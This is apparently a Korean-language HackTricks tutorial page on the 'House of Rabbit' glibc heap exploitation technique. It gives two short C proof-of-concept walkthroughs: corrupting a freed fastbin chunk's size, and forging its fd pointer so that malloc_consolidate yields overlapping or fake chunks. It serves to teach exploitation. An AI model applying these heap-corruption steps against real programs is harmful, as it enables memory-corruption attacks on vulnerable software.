# 토끼의 집

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)를 통해 제로부터 영웅이 될 때까지 AWS 해킹을 배우세요!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나 HackTricks를 PDF로 다운로드하길 원한다면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 저희의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f)에 가입하거나 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)를 팔로우하세요.**
* **해킹 트릭을 공유하려면 PR을 제출하여** [**HackTricks**](https://github.com/carlospolop/hacktricks) **및** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **깃허브 저장소에 기여하세요.**

</details>

### 요구 사항

1. **Fastbin fd 포인터 또는 크기 수정 능력**: 이는 fastbin의 순방향 포인터 또는 크기를 변경할 수 있는 능력을 의미합니다.
2. **`malloc_consolidate`를 트리거할 수 있는 능력**: 큰 청크를 할당하거나 최상위 청크를 병합하여 힙이 청크를 통합하도록 하는 것으로 수행할 수 있습니다.

### 목표

1. **중첩된 청크 생성**: 다른 청크와 중첩되도록 하여 추가 힙 조작을 가능케 합니다.
2. **가짜 청크 조작**: 할당기를 속여 가짜 청크를 힙 작업 중에 정당한 청크로 취급하도록 합니다.

## 공격 단계

### POC 1: Fastbin 청크의 크기 수정

**목표**: fastbin 청크의 크기를 조작하여 중첩된 청크를 생성합니다.

* **단계 1: 청크 할당**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
* **단계 2: 청크 해제**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
* **단계 3: 청크 크기 수정**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
* **단계 4: `malloc_consolidate`를 트리거합니다**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
대규모 청크를 할당하면 `malloc_consolidate` 함수가 트리거되어 fastbin에서 작은 청크를 병합합니다. `chunk1`의 조작된 크기로 인해 `chunk2`와 겹칩니다.

통합 후 `chunk1`은 `chunk2`와 겹쳐져 추가적인 악용이 가능해집니다.

### POC 2: FD 포인터 수정

**목표**: fastbin fd 포인터를 조작하여 가짜 청크를 생성합니다.

* **단계 1: 청크 할당**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**설명**: 우리는 가짜 청크를 설정하기 위해 하나는 작고 다른 하나는 큰 두 청크를 할당합니다.

* **단계 2: 가짜 청크 생성**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
* **단계 3: 청크1 해제**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**설명**: 우리는 `chunk1`을 해제하여 fastbin 목록에 추가합니다.

* **단계 4: Chunk1의 FD 수정**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**설명**: `chunk1`의 전방향 포인터(fd)를 `chunk2` 내의 가짜 청크를 가리키도록 변경합니다.

* **단계 5: `malloc_consolidate`를 트리거합니다**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
큰 청크를 다시 할당하면 `malloc_consolidate`가 트리거되어 가짜 청크를 처리합니다.

가짜 청크는 fastbin 목록의 일부가 되어 추가적인 악용을 위한 합법적인 청크가 됩니다.

### 요약

**House of Rabbit** 기술은 fastbin 청크의 크기를 수정하여 겹치는 청크를 만들거나 fd 포인터를 조작하여 가짜 청크를 만드는 것을 포함합니다. 이를 통해 공격자는 힙에 합법적인 청크를 위조하여 다양한 형태의 악용을 가능케 합니다. 이러한 단계를 이해하고 연습함으로써 힙 악용 기술을 향상시킬 수 있습니다.
